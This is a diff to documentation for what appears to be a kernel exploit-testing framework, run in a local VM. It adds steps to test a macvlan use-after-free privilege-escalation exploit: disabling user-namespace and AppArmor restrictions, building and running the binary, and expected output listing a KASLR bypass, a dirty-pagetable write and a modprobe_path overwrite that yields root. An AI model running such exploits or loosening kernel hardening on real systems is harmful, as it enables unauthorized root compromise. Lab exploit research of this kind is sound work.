@@ -180,7 +180,56 @@ This script handles everything:
 | Check | File | Expected |
 |-------|------|----------|
 | Payload completed | `exploit_run.log` | Contains `EXPLOIT COMPLETE` or `DEMO COMPLETE` |
-| Bug triggered | `dmesg_tail.log` | Contains `vuln_drill: UAF` or similar |
+| Privilege escalation | `exploit_run.log` | Contains `PRIVILEGE ESCALATION SUCCESSFUL` |
+| Root achieved | `exploit_run.log` | Contains `uid=0 euid=0` |
+| Kernel panic | serial log | No panic messages |
+
+---
+
+## Testing CVE-2026-23209 (macvlan UAF)
+
+The CVE-2026-23209 exploit requires user namespaces with network privileges. On Ubuntu,
+the default kernel restricts these. To test:
+
+### Enable Permissive Kernel Settings (requires sudo in guest)
+
+```bash
+# Inside the guest, as sudo:
+sudo sysctl -w kernel.unprivileged_userns_clone=1
+sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
+```
+
+### Build and Run
+
+```bash
+# From host:
+source venv/bin/activate
+angband init CVE-2026-23209 --target ubuntu-24.04-x86_64
+angband generate
+
+# From guest:
+scp -P 2222 -i mordor_run/ssh/id_ed25519 localhost:/path/to/angband/mordor_run/current/cve_2026_23209 /tmp/
+chmod +x /tmp/cve_2026_23209
+/tmp/cve_2026_23209
+```
+
+### Expected Output
+
+```
+[*] ===== Stage: prep =====
+[*] ===== Stage: groom =====
+[*] ===== Stage: trigger =====
+[+] UAF triggered: net_device freed
+[*] ===== Stage: leak =====
+[+] KASLR bypass: kernel_base = 0xffffffff...
+[*] ===== Stage: primitive =====
+[*] PTE reclaim + dirty pagetable write
+[*] ===== Stage: escalate =====
+[*] modprobe_path overwrite
+[+] ROOT ACHIEVED via modprobe_path!
+[+] PRIVILEGE ESCALATION SUCCESSFUL
+[+] uid=0 euid=0 gid=0 egid=0
+```
 
 ---
 
@@ -195,7 +244,7 @@ ssh -o StrictHostKeyChecking=no -i mordor_run/ssh/id_ed25519 -p 2222 ubuntu@loca
 cd /mnt/angband
 
 # Run the exploit
-./mordor_run/current/exploit
+./mordor_run/current/cve_2026_23209
 
 # Check kernel logs
 sudo dmesg | grep 'vuln_drill:'
